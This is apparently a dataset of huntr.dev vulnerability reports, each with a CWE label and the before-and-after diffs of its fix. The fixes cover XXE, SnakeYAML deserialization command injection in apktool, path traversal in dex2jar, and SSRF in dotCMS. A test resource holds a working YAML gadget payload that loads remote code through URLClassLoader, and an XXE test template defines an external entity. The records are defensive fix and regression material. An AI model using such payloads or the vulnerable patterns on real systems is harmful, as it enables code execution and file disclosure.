        ignoreXxeFailureProp.setOrClearProperty(""true"");
        XmlUtil.setFeature(dbf, ""test://no-such-feature"");
    }

    @SuppressWarnings(""deprecation"")
    @Test
    public void testGetSAXParserFactory() throws Exception {
        SAXParserFactory saxParserFactory = XmlUtil.getSAXParserFactory();
        assertNotNull(saxParserFactory);
        // check if the XXE protection is enabled
        SAXParser saxParser = saxParserFactory.newSAXParser();
        assertThrows(SAXException.class,
                () -> saxParser.parse(new ByteArrayInputStream(server.getTestXml().getBytes(UTF_8)), new HandlerBase()));
        assertEquals(0, server.getHits());

        assertThrows(SAXException.class, () -> XmlUtil.setFeature(saxParserFactory, ""test://no-such-feature""));
        ignoreXxeFailureProp.setOrClearProperty(""false"");
        assertThrows(SAXException.class, () -> XmlUtil.setFeature(saxParserFactory, ""test://no-such-feature""));
        ignoreXxeFailureProp.setOrClearProperty(""true"");
        XmlUtil.setFeature(saxParserFactory, ""test://no-such-feature"");
    }

    @Test
    public void testGetXmlInputFactory() throws Exception {
        XMLInputFactory xmlInputFactory = XmlUtil.getXMLInputFactory();
        assertNotNull(xmlInputFactory);
        // check if the XXE protection is enabled
        assertThrows(XMLStreamException.class,
                () -> staxReadEvents(xmlInputFactory.createXMLEventReader(new StringReader(server.getTestXml()))));
        assertEquals(0, server.getHits());

        assertThrows(IllegalArgumentException.class,
                () -> XmlUtil.setProperty(xmlInputFactory, ""test://no-such-property"", false));
        ignoreXxeFailureProp.setOrClearProperty(""false"");
        assertThrows(IllegalArgumentException.class,
                () -> XmlUtil.setProperty(xmlInputFactory, ""test://no-such-property"", false));
        ignoreXxeFailureProp.setOrClearProperty(""true"");
        XmlUtil.setProperty(xmlInputFactory, ""test://no-such-feature"", false);
    }

    private void staxReadEvents(XMLEventReader reader) throws XMLStreamException {
        try {
            while (reader.hasNext()) {
                reader.nextEvent();
            }
        } finally {
            reader.close();
        }
    }

    static class DummyServer implements Runnable {
        private static final String XXE_TEST_STR_TEMPLATE = ""<?xml version=\""1.0\"" encoding=\""utf-8\""?>\n""
                + ""  <!DOCTYPE test [\n"" + ""    <!ENTITY xxe SYSTEM \""%s\"">\n"" + ""  ]>"" + ""<a><b>&xxe;</b></a>"";

        private final ServerSocket serverSocket;
        private final AtomicInteger counter = new AtomicInteger();

        DummyServer() throws IOException {
            serverSocket = new ServerSocket(0, 5, InetAddress.getLoopbackAddress());
        }

        public void start() {
            new Thread(this, ""DummyServer-acceptor"").start();
        }

        public String getUrlString() {
            return ""http://127.0.0.1:"" + serverSocket.getLocalPort();
        }

        public String getTestXml() {
            return String.format(XXE_TEST_STR_TEMPLATE, getUrlString());
        }

        public int getHits() {
            return counter.get();
        }

        public void stop() {
            try {
                serverSocket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void run() {
            while (true) {
                try (Socket socket = serverSocket.accept()) {
                    System.out.println("">> connection accepted: "" + socket);
                    counter.incrementAndGet();
                } catch (Exception e) {
                    System.out.println("">> stopping the server. Cause: "" + e.getClass().getName());
                    return;
                }
            }
        }
    }
}"
https://huntr.dev/bounties/d2246081-21fc-4e68-9e04-5bb4095d3624/,Command Injection in ibotpeaches/apktool,Arbitrary code execution when an APK is built with a malicious apktool.yml due to SnakeYAML's load() function,,CWE-77: Command Injection,https://www.github.com/ibotpeaches/apktool/commit/4065717b450f557f385495c6cd80bd0da10dba10,"@@ -18,13 +18,38 @@

import org.yaml.snakeyaml.constructor.AbstractConstruct;
import org.yaml.snakeyaml.constructor.Constructor;

import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.nodes.ScalarNode;
import org.yaml.snakeyaml.nodes.Tag;



public class StringExConstructor extends Constructor {
    public StringExConstructor() {


        this.yamlConstructors.put(Tag.STR, new ConstructStringEx());




















    }

    private class ConstructStringEx extends AbstractConstruct {

@@ -19,8 +19,8 @@
import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.representer.Representer;

public class StringExRepresent extends Representer {
    public StringExRepresent() {
        RepresentStringEx representStringEx = new RepresentStringEx();
        multiRepresenters.put(String.class, representStringEx);
        representers.put(String.class, representStringEx);

@@ -43,11 +43,11 @@ private static Yaml getYaml() {
        DumperOptions options = new DumperOptions();
        options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);

        StringExRepresent representer = new StringExRepresent();
        PropertyUtils propertyUtils = representer.getPropertyUtils();
        propertyUtils.setSkipMissingProperties(true);

        return new Yaml(new StringExConstructor(), representer, options);
    }

    public void save(Writer output) {

@@ -0,0 +1,50 @@


















































@@ -0,0 +1,4 @@




@@ -0,0 +1,23 @@























","29
...ut/androlib/meta/StringExConstructor.java → ...t/androlib/meta/ClassSafeConstructor.java
@@ -18,13 +18,38 @@

import org.yaml.snakeyaml.constructor.AbstractConstruct;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.error.YAMLException;
import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.nodes.ScalarNode;
import org.yaml.snakeyaml.nodes.Tag;
import java.util.ArrayList;
import java.util.List;

public class StringExConstructor extends Constructor {
    public StringExConstructor() {
public class ClassSafeConstructor extends Constructor {
    protected final List<Class<?>> allowableClasses = new ArrayList<>();

    public ClassSafeConstructor() {
        this.yamlConstructors.put(Tag.STR, new ConstructStringEx());

        this.allowableClasses.add(MetaInfo.class);
        this.allowableClasses.add(PackageInfo.class);
        this.allowableClasses.add(UsesFramework.class);
        this.allowableClasses.add(VersionInfo.class);
    }

    protected Object newInstance(Node node) {
        if (this.yamlConstructors.containsKey(node.getTag()) || this.allowableClasses.contains(node.getType())) {
            return super.newInstance(node);
        }
        throw new YAMLException(""Invalid Class attempting to be constructed: "" + node.getTag());
    }

    protected Object finalizeConstruction(Node node, Object data) {
        if (this.yamlConstructors.containsKey(node.getTag()) || this.allowableClasses.contains(node.getType())) {
            return super.finalizeConstruction(node, data);
        }

        return this.newInstance(node);
    }

    private class ConstructStringEx extends AbstractConstruct {
4
...brut/androlib/meta/StringExRepresent.java → ...drolib/meta/EscapedStringRepresenter.java
@@ -19,8 +19,8 @@
import org.yaml.snakeyaml.nodes.Node;
import org.yaml.snakeyaml.representer.Representer;

public class StringExRepresent extends Representer {
    public StringExRepresent() {
public class EscapedStringRepresenter extends Representer {
    public EscapedStringRepresenter() {
        RepresentStringEx representStringEx = new RepresentStringEx();
        multiRepresenters.put(String.class, representStringEx);
        representers.put(String.class, representStringEx);
4
brut.apktool/apktool-lib/src/main/java/brut/androlib/meta/MetaInfo.java
@@ -43,11 +43,11 @@ private static Yaml getYaml() {
        DumperOptions options = new DumperOptions();
        options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);

        StringExRepresent representer = new StringExRepresent();
        EscapedStringRepresenter representer = new EscapedStringRepresenter();
        PropertyUtils propertyUtils = representer.getPropertyUtils();
        propertyUtils.setSkipMissingProperties(true);

        return new Yaml(new StringExConstructor(), representer, options);
        return new Yaml(new ClassSafeConstructor(), representer, options);
    }

    public void save(Writer output) {
50
brut.apktool/apktool-lib/src/test/java/brut/androlib/yaml/MaliciousYamlTest.java
@@ -0,0 +1,50 @@
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the ""License"");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an ""AS IS"" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.yaml;

import brut.androlib.Androlib;
import brut.androlib.BaseTest;
import brut.androlib.TestUtils;
import brut.androlib.options.BuildOptions;
import brut.common.BrutException;
import brut.directory.ExtFile;
import brut.util.OS;
import org.junit.BeforeClass;
import org.junit.Test;
import org.yaml.snakeyaml.constructor.ConstructorException;

import java.io.File;

public class MaliciousYamlTest extends BaseTest {

    @BeforeClass
    public static void beforeClass() throws Exception {
        TestUtils.cleanFrameworkFile();

        sTmpDir = new ExtFile(OS.createTempDirectory());
        sTestNewDir = new ExtFile(sTmpDir, ""cve20220476"");
        LOGGER.info(""Unpacking cve20220476..."");
        TestUtils.copyResourceDir(MaliciousYamlTest.class, ""yaml/cve20220476/"", sTestNewDir);
    }

    @Test(expected = ConstructorException.class)
    public void testMaliciousYamlNotLoaded() throws BrutException {
        BuildOptions buildOptions = new BuildOptions();
        File testApk = new File(sTmpDir, ""cve20220476.apk"");
        new Androlib(buildOptions).build(sTestNewDir, testApk);
    }
}
4
brut.apktool/apktool-lib/src/test/resources/yaml/cve20220476/AndroidManifest.xml
@@ -0,0 +1,4 @@
<?xml version=""1.0"" encoding=""utf-8"" standalone=""no""?><manifest xmlns:android=""http://schemas.android.com/apk/res/android"" android:compileSdkVersion=""30"" android:compileSdkVersionCodename=""11"" package=""com.ibotpeaches.cve20220476"" platformBuildVersionCode=""30"" platformBuildVersionName=""11"">
    <application android:debuggable=""true"" android:forceQueryable=""true"">
    </application>
</manifest>
23
brut.apktool/apktool-lib/src/test/resources/yaml/cve20220476/apktool.yml
@@ -0,0 +1,23 @@
!!brut.androlib.meta.MetaInfo
apkFileName: cve20220476.apk
compressionType: false
some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [""https://127.0.0.1:8000""]]]]
doNotCompress:
- resources.arsc
isFrameworkApk: false
packageInfo:
  forcedPackageId: '127'
  renameManifestPackage: null
sdkInfo:
  minSdkVersion: '25'
  targetSdkVersion: '30'
sharedLibrary: false
sparseResources: false
usesFramework:
  ids:
  - 1
  tag: null
version: 2.6.1-ddc4bb-SNAPSHOT
versionInfo:
  versionCode: null
  versionName: null"
https://huntr.dev/bounties/0a732190-b846-4588-aed5-8e976bd98cc2/,Relative Path Traversal in thexxturboxx/dex2jar,"This vulnerability is originally reported to pxb1988/dex2jar, but re-sending it again for maintained fork repository as requested.",,CWE-23: Relative Path Traversal,https://www.github.com/thexxturboxx/dex2jar/commit/d064c19d3547434b687030a9f4b76161c2cf91c8,"@@ -92,17 +92,25 @@ static String escapeType(String id) {
        return escapeBuff.toString();
    }







    static void escapeId0(StringBuilder sb, String id) {
        for (int i = 0; i < id.length(); ++i) {
            char c = id.charAt(i);
            escape1(sb, c);
        }
    }

    static String escapeId(String id) {
        StringBuilder escapeBuff = new StringBuilder();
        escapeId0(escapeBuff, id);
        return escapeBuff.toString();


    }

    static void escape1(final StringBuilder buf, char c) {

","18
d2j-smali/src/main/java/com/googlecode/d2j/smali/BaksmaliDumper.java
@@ -92,17 +92,25 @@ static String escapeType(String id) {
        return escapeBuff.toString();
    }

    static String escapeId(String id) {
        StringBuilder escapeBuff = new StringBuilder();
        escapeId0(escapeBuff, id);
        return escapeBuff.toString();
    }

    static void escapeId0(StringBuilder sb, String id) {
        for (int i = 0; i < id.length(); ++i) {
            char c = id.charAt(i);
            escape1(sb, c);
            escapeId1(sb, c);
        }
    }

    static String escapeId(String id) {
        StringBuilder escapeBuff = new StringBuilder();
        escapeId0(escapeBuff, id);
        return escapeBuff.toString();
    static void escapeId1(final StringBuilder buf, char c) {
        if (c == '\\' || c == '/' || c == '.') {
            buf.append(String.format(""\\u%04x"", (int) c));
        } else {
            escape1(buf, c);
        }
    }

    static void escape1(final StringBuilder buf, char c) {"
https://huntr.dev/bounties/acd74536-dea0-4507-8c2c-1df3e21a948a/,Improper Restriction of XML External Entity Reference in mybatis/generator,"The isConfigFile() function makes use of SAXParser generated from a SAXParserFactory with no FEATURE_SECURE_PROCESSING set, allowing for XXE attacks. In https://github.com/mybatis/generator/blob/f3907d3a4aad257e17ed3047bc4b089cdf5f92ca/eclipse/org.mybatis.generator.eclipse.ui/src/org/mybatis/generator/eclipse/ui/content/ConfigVerifyer.java#L99",,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/mybatis/generator/commit/7abca136dc43b5ef83441a3d255201c63b6a29bc,"@@ -97,6 +97,8 @@ public boolean isConfigurationFile() {
boolean isConfigFile(InputStream inputStream) {
try {
SAXParserFactory factory = SAXParserFactory.newInstance();


factory.setValidating(false);
SAXParser parser = factory.newSAXParser();


","2
...tis.generator.eclipse.ui/src/org/mybatis/generator/eclipse/ui/content/ConfigVerifyer.java
@@ -97,6 +97,8 @@ public boolean isConfigurationFile() {
    boolean isConfigFile(InputStream inputStream) {
        try {
            SAXParserFactory factory = SAXParserFactory.newInstance();
            factory.setFeature(""http://xml.org/sax/features/external-general-entities"", false);
            factory.setFeature(""http://xml.org/sax/features/external-parameter-entities"", false);
            factory.setValidating(false);
            SAXParser parser = factory.newSAXParser();"
https://huntr.dev/bounties/f2d70cb5-26f2-4884-af17-0e33b9f72001/,Improper Restriction of XML External Entity Reference in dotcms/core,"Hello, dotCMS has an XXE vulnerability in the template design page. To exploit this flaw, a attacker needs the permission to edit and preview templates, and this can be abused to read internal files",,CWE-611: Improper Restriction of XML External Entity Reference,https://www.github.com/dotcms/core/commit/0b62547344d3a703fed69af8e5431bde79441fbc,"@@ -54,6 +54,7 @@
import com.dotcms.rendering.velocity.viewtools.DotTemplateToolTest;
import com.dotcms.rendering.velocity.viewtools.FileToolTest;
import com.dotcms.rendering.velocity.viewtools.JSONToolTest;

import com.dotcms.rest.BundlePublisherResourceIntegrationTest;
import com.dotcms.rest.BundleResourceTest;
import com.dotcms.rest.IntegrityResourceIntegrationTest;
@@ -494,7 +495,8 @@
        Task211101AddContentletAsJsonColumnTest.class,
        ContentletJsonAPITest.class,
        ContentletJsonAPITest.class,
        Task211103RenameHostNameLabelTest.class

})
public class MainSuite {


@@ -1,6 +1,8 @@
package com.dotcms.http;

import com.dotcms.rest.exception.BadRequestException;


import java.io.IOException;
import java.io.OutputStream;
import java.util.Map;
@@ -54,27 +56,51 @@ public void testGoodBreaker() throws Exception {


    @Test
    public void testBadBreaker() throws ExecutionException {




        final NullOutputStream nos = new NullOutputStream();


        final String key = ""testBadBreaker"";
        final int timeout = 2000;

        CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
        assert (breaker.isClosed());

























        for (int i = 0; i < 10; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                assert (e instanceof CircuitBreakerOpenException);

            }
        }
        breaker = CurcuitBreakerPool.getBreaker(key);

        assert (breaker.isOpen());
    }

    /*
@@ -86,7 +112,7 @@ public void testBadBreaker() throws ExecutionException {


    //@Test
    public void testHeaders() throws ExecutionException, CircuitBreakerOpenException, IOException {
        Map<String, String> headers = ImmutableMap.of(HEADER, HEADER_VALUE);

        CircuitBreakerUrl cburl = CircuitBreakerUrl.builder().setMethod(Method.GET).setUrl(""http://localhost/get"").setTimeout(1000)
@@ -108,7 +134,7 @@ public void testHeaders() throws ExecutionException, CircuitBreakerOpenException
     * docker run -p 80:80 kennethreitz/httpbin
     */
    //@Test
    public void testPost() throws ExecutionException, CircuitBreakerOpenException, IOException {
        Map<String, String> params = ImmutableMap.of(PARAM, PARAM_VALUE);

        CircuitBreakerUrl cburl = CircuitBreakerUrl.builder().setMethod(Method.POST).setUrl(""http://localhost/post"").setTimeout(1000)
@@ -127,66 +153,68 @@ public void testPost() throws ExecutionException, CircuitBreakerOpenException, I
     */
    @Test
    public void testRecovery() throws  InterruptedException, IOException {





















        final NullOutputStream nos = new NullOutputStream();


        final String key = ""testRecoveryBreaker"";
        final int timeout = 2000;

        CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
        breaker.withDelay(5, TimeUnit.SECONDS);
        assert (breaker.isClosed());


















        for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                // shoud not be here
                assert (false);
            }
        }

        assert (breaker.isClosed());

        for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                assert (e instanceof CircuitBreakerOpenException);


            }
        }
        assert (breaker.isOpen());
        for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (CircuitBreakerOpenException e) {
                assert (e instanceof CircuitBreakerOpenException);
            }
        }
        Thread.sleep(breaker.getDelay().toMillis() + 1000);

        try {
            new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
        } catch (Exception e) {
            // shoud not be here
            assert (false);
        }

        assert (breaker.isHalfOpen());

        for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                // shoud not be here
                assert (false);
            }
        }

        assert (breaker.isClosed());
    }

    @Test

@@ -0,0 +1,26 @@


























@@ -3,6 +3,7 @@
import com.dotcms.rest.EmptyHttpResponse;
import com.dotcms.rest.api.v1.DotObjectMapperProvider;
import com.dotcms.rest.exception.BadRequestException;

import com.dotmarketing.business.DotStateException;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Config;
@@ -193,6 +194,11 @@ public void doOut(final HttpServletResponse response) throws IOException {
                                .setConnectionRequestTimeout(Math.toIntExact(this.timeoutMs))
                                .setSocketTimeout(Math.toIntExact(this.timeoutMs)).build();
                        try (CloseableHttpClient httpclient = HttpClientBuilder.create().setDefaultRequestConfig(config).build()) {





                            HttpResponse innerResponse = httpclient.execute(this.request);

                            this.responseHeaders = innerResponse.getAllHeaders();

@@ -22,6 +22,9 @@
import com.dotcms.rendering.velocity.viewtools.bean.XmlToolDoc;
import com.dotcms.rendering.velocity.viewtools.cache.XmlToolCache;
import com.dotcms.rendering.velocity.viewtools.util.ConversionUtils;



import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
@@ -146,8 +149,17 @@ protected void read(String file) throws Exception {
  * this instance.
  */
 protected void read(URL url) throws Exception {
  SAXReader reader = new SAXReader();
  setRoot(reader.read(url));









 }

 /**

@@ -1,12 +1,12 @@
package com.dotcms.util.network;

import java.net.InetAddress;
import java.util.Objects;
import org.xbill.DNS.Address;
import com.dotcms.repackage.org.apache.commons.net.util.SubnetUtils;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Logger;
import com.dotmarketing.util.UtilMethods;

import io.vavr.control.Try;

public class IPUtils {
@@ -43,9 +43,14 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {

    }

    final static private String[] privateSubnets = {""10.0.0.0/8"",""172.16.0.0/12"", ""192.168.0.0/16""};








    /**
     * It is important when we allow calling to remote endpoints that we verify
@@ -57,24 +62,18 @@ public static boolean isIpInCIDR(final String ip, final String CIDR) {
     */
    public static boolean isIpPrivateSubnet(final String ipOrHostName) {



        if (ipOrHostName == null) {
            return true;
        }

        try {
            InetAddress addr = Address.getByName(ipOrHostName);

            final String ip = addr.getHostAddress();

            if (""127.0.0.1"".equals(ip)) {
                return true;
            }

            if (""localhost"".equals(ip)) {
                return true;
            }

            for (String subnet : privateSubnets) {
                if (isIpInCIDR(ip, subnet)) {
                    return true;
                }

@@ -64,7 +64,8 @@ public void test_false_cases() {
            ""127.0.0.1"",
            ""172.16.3.5"",
            ""172.16.3.0"",
            ""localhost""

    };

    final static String[] ipsOnPublicSubnets= {

","4
dotCMS/src/integration-test/java/com/dotcms/MainSuite.java
@@ -54,6 +54,7 @@
import com.dotcms.rendering.velocity.viewtools.DotTemplateToolTest;
import com.dotcms.rendering.velocity.viewtools.FileToolTest;
import com.dotcms.rendering.velocity.viewtools.JSONToolTest;
import com.dotcms.rendering.velocity.viewtools.XmlToolTest;
import com.dotcms.rest.BundlePublisherResourceIntegrationTest;
import com.dotcms.rest.BundleResourceTest;
import com.dotcms.rest.IntegrityResourceIntegrationTest;
@@ -494,7 +495,8 @@
        Task211101AddContentletAsJsonColumnTest.class,
        ContentletJsonAPITest.class,
        ContentletJsonAPITest.class,
        Task211103RenameHostNameLabelTest.class
        Task211103RenameHostNameLabelTest.class,
        XmlToolTest.class
})
public class MainSuite {

144
dotCMS/src/integration-test/java/com/dotcms/http/CircuitBreakerUrlTest.java
@@ -1,6 +1,8 @@
package com.dotcms.http;

import com.dotcms.rest.exception.BadRequestException;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Config;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Map;
@@ -54,27 +56,51 @@ public void testGoodBreaker() throws Exception {


    @Test
    public void testBadBreaker() throws ExecutionException {
    public void testBadBreaker() {

        try {
            final NullOutputStream nos = new NullOutputStream();

        final NullOutputStream nos = new NullOutputStream();
            final String key = ""testBadBreaker"";
            final int timeout = 2000;

        final String key = ""testBadBreaker"";
        final int timeout = 2000;
            CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
            assert (breaker.isClosed());

        CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
        assert (breaker.isClosed());
            Config.setProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", true);

            for (int i = 0; i < 10; i++) {
                try {
                    new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
                } catch (Exception e) {
                    assert (e instanceof CircuitBreakerOpenException);
                }
            }
            breaker = CurcuitBreakerPool.getBreaker(key);

            assert (breaker.isOpen());
        }finally {
            Config.setProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", false);
        }
    }

    @Test
    public void test_breaker_url_using_private_ip_throws_an_exception()  {
            final NullOutputStream nos = new NullOutputStream();

            final String key = ""testPrivateIP"";
            final int timeout = 2000;

            CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
            assert (breaker.isClosed());

        for (int i = 0; i < 10; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                assert (e instanceof CircuitBreakerOpenException);
                assert (e instanceof DotRuntimeException);
                assert (e.getMessage().contains(""Remote HttpRequests cannot access private subnets""));
            }
        }
        breaker = CurcuitBreakerPool.getBreaker(key);

        assert (breaker.isOpen());
    }

    /*
@@ -86,7 +112,7 @@ public void testBadBreaker() throws ExecutionException {


    //@Test
    public void testHeaders() throws ExecutionException, CircuitBreakerOpenException, IOException {
    public void testHeaders() throws CircuitBreakerOpenException, IOException {
        Map<String, String> headers = ImmutableMap.of(HEADER, HEADER_VALUE);

        CircuitBreakerUrl cburl = CircuitBreakerUrl.builder().setMethod(Method.GET).setUrl(""http://localhost/get"").setTimeout(1000)
@@ -108,7 +134,7 @@ public void testHeaders() throws ExecutionException, CircuitBreakerOpenException
     * docker run -p 80:80 kennethreitz/httpbin
     */
    //@Test
    public void testPost() throws ExecutionException, CircuitBreakerOpenException, IOException {
    public void testPost() throws CircuitBreakerOpenException, IOException {
        Map<String, String> params = ImmutableMap.of(PARAM, PARAM_VALUE);

        CircuitBreakerUrl cburl = CircuitBreakerUrl.builder().setMethod(Method.POST).setUrl(""http://localhost/post"").setTimeout(1000)
@@ -127,66 +153,68 @@ public void testPost() throws ExecutionException, CircuitBreakerOpenException, I
     */
    @Test
    public void testRecovery() throws  InterruptedException, IOException {
        Config.setProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", true);

        try {
            final NullOutputStream nos = new NullOutputStream();

            final String key = ""testRecoveryBreaker"";
            final int timeout = 2000;

            CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
            breaker.withDelay(5, TimeUnit.SECONDS);
            assert (breaker.isClosed());

            for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
                try {
                    new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
                } catch (Exception e) {
                    // shoud not be here
                    assert (false);
                }
            }

        final NullOutputStream nos = new NullOutputStream();


        final String key = ""testRecoveryBreaker"";
        final int timeout = 2000;

        CircuitBreaker breaker = CurcuitBreakerPool.getBreaker(key);
        breaker.withDelay(5, TimeUnit.SECONDS);
        assert (breaker.isClosed());
            assert (breaker.isClosed());

            for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
                try {
                    new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
                } catch (Exception e) {
                    assert (e instanceof CircuitBreakerOpenException);
                }
            }
            assert (breaker.isOpen());
            for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
                try {
                    new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
                } catch (CircuitBreakerOpenException e) {
                    assert (e instanceof CircuitBreakerOpenException);
                }
            }
            Thread.sleep(breaker.getDelay().toMillis() + 1000);

        for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                // shoud not be here
                assert (false);
            }
        }

        assert (breaker.isClosed());
            assert (breaker.isHalfOpen());

        for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                assert (e instanceof CircuitBreakerOpenException);
            for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
                try {
                    new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
                } catch (Exception e) {
                    // shoud not be here
                    assert (false);
                }
            }
        }
        assert (breaker.isOpen());
        for (int i = 0; i < breaker.getFailureThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(badUrl, timeout, breaker).doOut(nos);
            } catch (CircuitBreakerOpenException e) {
                assert (e instanceof CircuitBreakerOpenException);
            }
        }
        Thread.sleep(breaker.getDelay().toMillis() + 1000);

        try {
            new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
        } catch (Exception e) {
            // shoud not be here
            assert (false);
            assert (breaker.isClosed());
        }finally {
            Config.setProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", false);
        }

        assert (breaker.isHalfOpen());

        for (int i = 0; i < breaker.getSuccessThreshold().denominator; i++) {
            try {
                new CircuitBreakerUrl(goodUrl, timeout, breaker).doOut(nos);
            } catch (Exception e) {
                // shoud not be here
                assert (false);
            }
        }

        assert (breaker.isClosed());
    }

    @Test
26
dotCMS/src/integration-test/java/com/dotcms/rendering/velocity/viewtools/XmlToolTest.java
@@ -0,0 +1,26 @@
package com.dotcms.rendering.velocity.viewtools;

import com.dotcms.util.IntegrationTestInitService;
import com.dotmarketing.exception.DotRuntimeException;
import java.net.URL;
import org.junit.BeforeClass;
import org.junit.Test;

public class XmlToolTest {
    @BeforeClass
    public static void prepare() throws Exception{
        //Setting web app environment
        IntegrationTestInitService.getInstance().init();
    }

    @Test
    public void test_xmltool_using_private_ip_should_throw_an_exception() {
        XmlTool xmlTool = new XmlTool();
        try {
            xmlTool.read(new URL(""https://localhost:9999/test""));
        } catch (Exception e){
            assert (e instanceof DotRuntimeException);
            assert (e.getMessage().contains(""XMLTool Cannot access private subnets""));
        }
    }
}
6
dotCMS/src/main/java/com/dotcms/http/CircuitBreakerUrl.java
@@ -3,6 +3,7 @@
import com.dotcms.rest.EmptyHttpResponse;
import com.dotcms.rest.api.v1.DotObjectMapperProvider;
import com.dotcms.rest.exception.BadRequestException;
import com.dotcms.util.network.IPUtils;
import com.dotmarketing.business.DotStateException;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Config;
@@ -193,6 +194,11 @@ public void doOut(final HttpServletResponse response) throws IOException {
                                .setConnectionRequestTimeout(Math.toIntExact(this.timeoutMs))
                                .setSocketTimeout(Math.toIntExact(this.timeoutMs)).build();
                        try (CloseableHttpClient httpclient = HttpClientBuilder.create().setDefaultRequestConfig(config).build()) {

                            if(IPUtils.isIpPrivateSubnet(this.request.getURI().getHost()) && !Config.getBooleanProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", false)){
                                throw new DotRuntimeException(""Remote HttpRequests cannot access private subnets.  Set ALLOW_ACCESS_TO_PRIVATE_SUBNETS=true to allow"");
                            }

                            HttpResponse innerResponse = httpclient.execute(this.request);

                            this.responseHeaders = innerResponse.getAllHeaders();
16
dotCMS/src/main/java/com/dotcms/rendering/velocity/viewtools/XmlTool.java
@@ -22,6 +22,9 @@
import com.dotcms.rendering.velocity.viewtools.bean.XmlToolDoc;
import com.dotcms.rendering.velocity.viewtools.cache.XmlToolCache;
import com.dotcms.rendering.velocity.viewtools.util.ConversionUtils;
import com.dotcms.util.network.IPUtils;
import com.dotmarketing.exception.DotRuntimeException;
import com.dotmarketing.util.Config;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
@@ -146,8 +149,17 @@ protected void read(String file) throws Exception {
  * this instance.
  */
 protected void read(URL url) throws Exception {
  SAXReader reader = new SAXReader();
  setRoot(reader.read(url));


     if(IPUtils.isIpPrivateSubnet(url.getHost()) && !Config.getBooleanProperty(""ALLOW_ACCESS_TO_PRIVATE_SUBNETS"", false)){
         throw new DotRuntimeException(""XMLTool Cannot access private subnets.  Set ALLOW_ACCESS_TO_PRIVATE_SUBNETS=true to allow"");
     }

     SAXReader reader = new SAXReader();
     reader.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true);
     reader.setFeature(""http://xml.org/sax/features/external-general-entities"", false);
     reader.setFeature(""http://xml.org/sax/features/external-parameter-entities"", false);
     setRoot(reader.read(url));
 }

 /**
25
dotCMS/src/main/java/com/dotcms/util/network/IPUtils.java
@@ -1,12 +1,12 @@
package com.dotcms.util.network;

import java.net.InetAddress;
import java.util.Objects;
import org.xbill.DNS.Address;
import com.dotcms.repackage.org.apache.commons.net.util.SubnetUtils;
